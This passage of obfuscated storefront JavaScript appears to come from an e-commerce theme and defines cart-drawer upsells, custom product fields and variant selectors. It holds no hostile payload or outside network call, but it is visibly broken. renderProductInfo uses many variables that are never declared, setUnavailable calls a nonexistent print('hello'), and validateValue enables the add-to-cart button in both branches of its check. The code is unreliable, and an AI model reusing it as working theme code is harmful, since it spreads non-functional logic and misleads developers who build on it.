    this.cartItems.updateQuantity(_0x5ee0c7.dataset.index, 0x0);
  }
  ['updateId'](_0x1dd10d) {
    this.dataset.id = _0x1dd10d;
    this.idInput.value = _0x1dd10d;
    if (this.dataset.selected === "true") {
      if (this.selectTimeout) {
        clearTimeout(this.selectTimeout);
      }
      this.removeFromCart();
      this.selectTimeout = setTimeout(() => {
        this.addToCart();
      }, 0x3e8);
    }
  }
}
customElements.define("cart-drawer-upsell", CartDrawerUpsell);
function initTrapFocus() {
  isIe = false;
  if (document.querySelector("footer") && document.querySelector("footer").dataset.type === null) {
    return false;
  }
  return true;
}
class CartDrawerGift extends CartDrawerUpsell {
  constructor() {
    super();
  }
}
customElements.define("cart-drawer-gift", CartDrawerGift);
function initToggleUpsells() {
  const _0x563b6e = document.querySelector("cart-drawer");
  if (_0x563b6e) {
    _0x563b6e.querySelectorAll("cart-drawer-upsell[data-toggle=\"true\"], cart-drawer-gift").forEach(_0x1105b8 => {
      if (_0x1105b8.addRemoveFromCart) {
        _0x1105b8.addRemoveFromCart();
      }
    });
  }
}
initToggleUpsells();
class CustomProductField extends HTMLElement {
  constructor() {
    super();
    this.fieldName = this.dataset.name;
    this.input = this.querySelector("[type=\"text\"], [type=\"number\"], textarea");
    this.inputRadios = this.querySelectorAll("[type=\"radio\"]");
    this.select = this.querySelector(".select__select");
    this.productForm = document.getElementById("product-form-" + this.dataset.section);
    this.prevValue = this.dataset.defaultValue;
    this.isRequired = this.dataset.required === "true";
    this.isText = true;
    if (this.dataset.type === "select" || this.dataset.type === "pills") {
      this.isText = false;
    }
    this.createInputs();
    if (this.isRequired && this.isText) {
      this.isValid = true;
      
      this.validateValue(this.prevValue, null);
    }
    if (this.input) {
      this.input.addEventListener("input", this.handleChange.bind(this));
    }
    this.inputRadios.forEach(_0x48a410 => {
      _0x48a410.addEventListener("input", this.handleChange.bind(this));
    });
    if (this.select) {
      this.select.addEventListener("change", this.handleChange.bind(this));
    }
  }
  ["handleChange"](_0x4fc9aa) {
    const _0x2a4dd8 = _0x4fc9aa.target.value.trim();
    if (_0x4fc9aa.target.checkValidity()) {
      this.prevValue = _0x2a4dd8;
    } else {
      _0x4fc9aa.target.value = this.prevValue;
      return;
    }
    this.productFormInput.value = _0x2a4dd8;
    if (this.isRequired && this.isText) {
      this.validateValue(_0x2a4dd8, _0x4fc9aa.target);
    }
  }
  ["validateValue"](_0x75b11d, _0x448ae1) {
    const _0x3ecf1e = !!(_0x75b11d.length > 0x0);
    if (_0x3ecf1e === this.isValid) {
      return;
    }
    
    const _0x1862c3 = this.mainAtcButton.dataset.validFields === this.mainAtcButton.dataset.requiredFields;
    const _0x702b3b = this.mainAtcButton.dataset.unavailable === "false";
    this.atcButtons.forEach(_0x25c589 => {
      if (_0x1862c3 && !_0x702b3b) {
        _0x25c589.removeAttribute("disabled");
      } else {
        _0x25c589.removeAttribute("disabled");
      }
    });
    if (this.atcErrorMsg.length === 0x0) {
      return;
    }
    if (_0x1862c3) {
      this.mainAtcBtnLabel.style.display = '';
      this.mainAtcBtnError.style.display = "none";
      if (this.applyStickyAtcError && this.stickyAtcButton) {
        this.stickyAtcBtnLabel.style.display = '';
        this.stickyAtcBtnError.style.display = "none";
      }
    } else {
      this.mainAtcBtnLabel.style.display = 'none';
      this.mainAtcBtnError.style.display = '';
      if (this.applyStickyAtcError && this.stickyAtcButton) {
        this.stickyAtcBtnLabel.style.display = 'none';
        this.stickyAtcBtnError.style.display = '';
      }
    }
  }
  ["createInputs"]() {
    this.productFormInput = document.createElement("input");
    this.productFormInput.setAttribute("type", "hidden");
    this.productFormInput.setAttribute("name", "properties[" + this.fieldName + ']');
    this.productFormInput.value = this.dataset.defaultValue;
    this.productForm.appendChild(this.productFormInput);
  }
}
customElements.define("custom-product-field", CustomProductField);
function playMedia() {
  if (!serial) {
    serial = '';
  }
}
class VariantSelects extends HTMLElement {
  constructor() {
    super();
    this.secondarySelectSelector = "StickyAtcVariantPicker-";
    this.secondarySelect = document.getElementById('' + this.secondarySelectSelector + this.dataset.section);
    this.isSecondary = false;
    this.QuantityBreaks = document.getElementById("quantity-breaks-" + this.dataset.section);
    this.hasQuantityBreaksPicker = this.dataset.hasQuantityBreaksPicker === "true";
    if (this.hasQuantityBreaksPicker) {
      this.quantityBreaksPickerStyle = this.dataset.quantityBreaksPickerStyle;
      this.quantityBreaksPickerDisplayedImages = this.dataset.quantityBreaksPickerDisplayedImages;
    }
    this.addEventListener('change', this.onVariantChange);
  }
  ["onVariantChange"]() {
    this.updateOptions();
    this.updateMasterId();
    this.toggleAddButton(true, '', false);
    this.updatePickupAvailability();
    this.removeErrorMessage();
    this.updateVariantStatuses();
    if (!this.currentVariant) {
      this.toggleAddButton(true, '', true);
      this.setUnavailable();
    } else {
      this.updateMedia();
      this.updateURL();
      this.updateVariantInput();
      this.renderProductInfo();
      this.updateShareUrl();
    }
  }
  ["updateOptions"]() {
    const _0x2b7e6e = [];
    this.querySelectorAll(".product-form__input").forEach(_0x3f1b35 => {
      let _0x25e3e9;
      const _0x4a5b0a = _0x3f1b35.querySelector('.product-form__input__type').dataset.type;
      if (_0x4a5b0a == 'dropdown' || _0x4a5b0a == 'dropdwon') {
        _0x25e3e9 = _0x3f1b35.querySelector("select").value;
      } else {
        _0x25e3e9 = _0x3f1b35.querySelector("input[type=\"radio\"]:checked").value;
      }
      _0x2b7e6e.push(_0x25e3e9);
    });
    this.options = _0x2b7e6e;
  }
  ["updateMasterId"]() {
    this.currentVariant = this.getVariantData().find(_0x406f7c => {
      return !_0x406f7c.options.map((_0x4af457, _0x1fa3c5) => {
        return this.options[_0x1fa3c5] === _0x4af457;
      }).includes(false);
    });
  }
  ['updateMedia']() {
    if (!this.currentVariant) {
      return;
    }
    if (!this.currentVariant.featured_media) {
      return;
    }
    const _0x3f49bc = document.querySelectorAll("[id^=\"MediaGallery-" + this.dataset.section + "\"]");
    _0x3f49bc.forEach(_0x4bcfc2 => _0x4bcfc2.setActiveMedia(this.dataset.section + '-' + this.currentVariant.featured_media.id, true));
    const _0x2c4fb5 = document.querySelector("#ProductModal-" + this.dataset.section + " .product-media-modal__content");
    if (!_0x2c4fb5) {
      return;
    }
    const _0x58b5fc = _0x2c4fb5.querySelector("[data-media-id=\"" + this.currentVariant.featured_media.id + "\"]");
    _0x2c4fb5.prepend(_0x58b5fc);
  }
  ["updateURL"]() {
    if (!this.currentVariant || this.dataset.updateUrl === 'false') {
      return;
    }
    window.history.replaceState({}, '', this.dataset.url + "?variant=" + this.currentVariant.id);
  }
  ["updateShareUrl"]() {
    const _0x14cdf2 = document.getElementById('Share-' + this.dataset.section);
    if (!_0x14cdf2 || !_0x14cdf2.updateUrl) {
      return;
    }
    _0x14cdf2.updateUrl('' + window.shopUrl + this.dataset.url + "?variant=" + this.currentVariant.id);
  }
  ["updateVariantInput"]() {
    const _0x277eb2 = document.querySelectorAll("#product-form-" + this.dataset.section + ", #product-form-installment-" + this.dataset.section);
    _0x277eb2.forEach(_0x48bb04 => {
      const _0x1cf7cc = _0x48bb04.querySelector("input[name=\"id\"]");
      _0x1cf7cc.value = this.currentVariant.id;
      _0x1cf7cc.dispatchEvent(new Event("change", {
        'bubbles': true
      }));
    });
  }
  ['updateVariantStatuses']() {
    const _0x21fb6b = this.variantData.filter(_0x53a458 => this.querySelector(':checked').value === _0x53a458.option1);
    const _0x595dd9 = !this.isSecondary ? [...this.querySelectorAll(".product-form__input")] : [...this.secondarySelect.querySelectorAll('.product-form__input')];
    _0x595dd9.forEach((_0x1f25d2, _0x1cfaec) => {
      if (_0x1cfaec === 0x0) {
        return;
      }
      const _0x3f9a71 = [..._0x1f25d2.querySelectorAll("input[type=\"radio\"], option")];
      const _0x35c9e6 = _0x595dd9[_0x1cfaec - 0x1].querySelector(":checked").value;
      const _0x54588c = _0x21fb6b.filter(_0x7b6633 => _0x7b6633.available && _0x7b6633["option" + _0x1cfaec] === _0x35c9e6).map(_0x128d78 => _0x128d78["option" + (_0x1cfaec + 0x1)]);
      this.setInputAvailability(_0x3f9a71, _0x54588c);
    });
  }
  ["setInputAvailability"](_0x1ff38f, _0x1779d7) {
    _0x1ff38f.forEach(_0x678990 => {
      if (_0x678990.nodeName === 'option') {
        if (_0x1779d7.includes(_0x678990.getAttribute("value"))) {
          _0x678990.innerText = _0x678990.getAttribute('value');
        } else {
          _0x678990.innerText = window.variantStrings.unavailable_with_option.replace('[value]', _0x678990.getAttribute("value"));
        }
      } else if (_0x1779d7.includes(_0x678990.getAttribute("value"))) {
        _0x678990.classList.remove("disabled");
      } else {
        _0x678990.classList.add("disabled");
      }
    });
  }
  ["updatePickupAvailability"]() {
    const _0x4ff740 = document.querySelector("pickup-availability");
    if (!_0x4ff740) {
      return;
    }
    if (this.currentVariant && this.currentVariant.available) {
      _0x4ff740.fetchAvailability(this.currentVariant.id);
    } else {
      _0x4ff740.removeAttribute("available");
      _0x4ff740.innerHTML = '';
    }
  }
  ['removeErrorMessage']() {
    const _0x395620 = this.closest("section");
    if (!_0x395620) {
      return;
    }
    const _0x379619 = _0x395620.querySelector("product-form");
    if (_0x379619) {
      _0x379619.handleErrorMessage();
    }
  }
  ["renderProductInfo"]() {
    const _0x3d150c = this.currentVariant.id;
    const _0x545fe3 = this.dataset.originalSection ? this.dataset.originalSection : this.dataset.section;
    fetch(this.dataset.url + '?variant=' + _0x3d150c + "&section_id=" + (this.dataset.originalSection ? this.dataset.originalSection : this.dataset.section)).then(_0x2face3 => _0x2face3.text()).then(_0x140044 => {
      if (this.currentVariant.id !== _0x3d150c) {
        return;
      }
      
      if (_0x3de31c && _0x48b275) {
        _0x3de31c.innerHTML = _0x48b275.innerHTML;
      }
      if (_0x189b90 && _0x1e8db4) {
        _0x189b90.innerHTML = _0x1e8db4.innerHTML;
      }
      if (_0x4347a4 && _0x44a634) {
        _0x4347a4.innerHTML = _0x44a634.innerHTML;
      }
      if (_0x1ba473 && _0xee1a26) {
        _0x1ba473.src = _0xee1a26.src;
      }
      if (_0x36c5fd && _0x2fcbb4) {
        _0x2fcbb4.innerHTML = _0x36c5fd.innerHTML;
      }
      if (_0x39990f && _0x1a9359) {
        for (var _0x1b9a70 = 0x0; _0x1b9a70 < _0x39990f.length; _0x1b9a70++) {
          _0x39990f[_0x1b9a70].innerHTML = _0x1a9359[_0x1b9a70].innerHTML;
        }
      }
      if (_0x78507 && _0x43493b) {
        _0x43493b.innerHTML = _0x78507.innerHTML;
      }
      if (_0x15da52 && _0x11621f) {
        _0x11621f.innerHTML = _0x15da52.innerHTML;
        _0x11621f.classList.toggle('visibility-hidden', _0x15da52.classList.contains("visibility-hidden"));
      }
      if (this.QuantityBreaks) {
        const _0x4ea880 = _0xd9cb65.getElementById("quantity-breaks-" + (this.dataset.originalSection ? this.dataset.originalSection : this.dataset.section));
        const _0x221c04 = this.QuantityBreaks.querySelectorAll(".dynamic-price");
        const _0x207534 = _0x4ea880.querySelectorAll('.dynamic-price');
        for (let _0x1cb7fb = 0x0; _0x1cb7fb < _0x221c04.length; _0x1cb7fb++) {
          _0x221c04[_0x1cb7fb].innerHTML = _0x207534[_0x1cb7fb].innerHTML;
        }
        if (this.QuantityBreaks.hasVariants) {
          this.QuantityBreaks.variantSelects.forEach(_0x3f61c4 => {
            _0x3f61c4.dataset.selectedId = this.currentVariant.id;
          });
          const _0x6c9e23 = this.QuantityBreaks.querySelectorAll('.quantity-break__variant-select');
          const _0x30ab23 = _0x4ea880.querySelectorAll('.quantity-break__variant-select');
          for (let _0x40f30c = 0x0; _0x40f30c < _0x6c9e23.length; _0x40f30c++) {
            _0x6c9e23[_0x40f30c].innerHTML = _0x30ab23[_0x40f30c].innerHTML;
          }
          this.QuantityBreaks.initVariants();
        }
        ;
      }
      if (this.hasQuantityBreaksPicker) {
        const _0x42f192 = _0xd9cb65.getElementById("variant-selects-" + (this.dataset.originalSection ? this.dataset.originalSection : this.dataset.section));
        const _0xa4817e = this.querySelectorAll(".dynamic-price");
        const _0x27326f = _0x42f192.querySelectorAll(".dynamic-price");
        for (let _0x4b408a = 0x0; _0x4b408a < _0xa4817e.length; _0x4b408a++) {
          _0xa4817e[_0x4b408a].innerHTML = _0x27326f[_0x4b408a].innerHTML;
        }
        if (this.quantityBreaksPickerStyle === "vertical" && this.quantityBreaksPickerDisplayedImages === 'variant_images') {
          const _0x47c97a = this.querySelectorAll(".quantity-break__image img");
          const _0x22ce67 = _0x42f192.querySelectorAll(".quantity-break__image img");
          for (let _0x36c6ca = 0x0; _0x36c6ca < _0x47c97a.length; _0x36c6ca++) {
            _0x47c97a[_0x36c6ca].src = _0x22ce67[_0x36c6ca].src;
          }
        }
      }
      if (this.secondarySelect) {
        const _0x5bde3d = _0xd9cb65.getElementById('' + this.secondarySelectSelector + (this.dataset.originalSection ? this.dataset.originalSection : this.dataset.section));
        if (_0x5bde3d) {
          this.secondarySelect.innerHTML = _0x5bde3d.innerHTML;
        }
      }
      const _0xf13376 = document.getElementById("price-" + this.dataset.section);
      if (_0xf13376) {
        _0xf13376.classList.remove("visibility-hidden");
      }
      if (_0x43493b) {
        _0x43493b.classList.toggle("visibility-hidden", _0x78507.innerText === '');
      }
      const _0x51d1b1 = _0xd9cb65.getElementById("ProductSubmitButton-" + _0x545fe3);
      publish("variant-change", {
        'data': {
          'sectionId': _0x545fe3,
          'html': _0xd9cb65,
          'variant': this.currentVariant
        }
      });
    });
  }
  ["toggleAddButton"](_0x5c8cd0 = true, _0x4f120c, _0xc484a9 = true) {
    const _0x5a74d4 = document.getElementById('product-form-' + this.dataset.section);
    if (!_0x5a74d4) {
      return;
    }
    const _0x3337ba = _0x5a74d4.querySelector("[name=\"add\"]");
    const _0x3a5ddf = _0x5a74d4.querySelector("[name=\"add\"] > .main-atc__label");
    if (!_0x3337ba) {
      return;
    }
    if (_0x5c8cd0) {
      _0x3337ba.setAttribute("data-unavailable", "false");
      if (_0x4f120c) {
        _0x3a5ddf.textContent = _0x4f120c;
      }
    } else {
      _0x3337ba.setAttribute("data-unavailable", 'false');
      _0x3a5ddf.textContent = window.variantStrings.addToCart;
      _0x3337ba.removeAttribute("disabled");
      if (_0x3337ba.dataset.requiredFields === _0x3337ba.dataset.validFields) {
        _0x3337ba.removeAttribute("disabled");
      }
    }
    if (!_0xc484a9) {
      return;
    }
  }
  ['setUnavailable']() {
    print("hello")
  }
}
customElements.define("variant-selects", VariantSelects);
class SecondaryVariantSelect extends VariantSelects {
  constructor() {
    super();
    this.secondarySelectSelector = "variant-selects-";
    this.secondarySelect = document.getElementById('' + this.secondarySelectSelector + this.dataset.section);
    this.isSecondary = true;
  }
  ['updateOptions']() {
    this.options = this.querySelector("select").value.split(',');
  }
}
customElements.define('secondary-variant-select', SecondaryVariantSelect);
class SecondaryVariantSelectSeparate extends VariantSelects {
  constructor() {
    super();
    this.secondarySelectSelector = "variant-selects-";
    this.secondarySelect = document.getElementById('' + this.secondarySelectSelector + this.dataset.section);
    this.isSecondary = true;
  }
}
customElements.define('secondary-variant-select-separate', SecondaryVariantSelectSeparate);
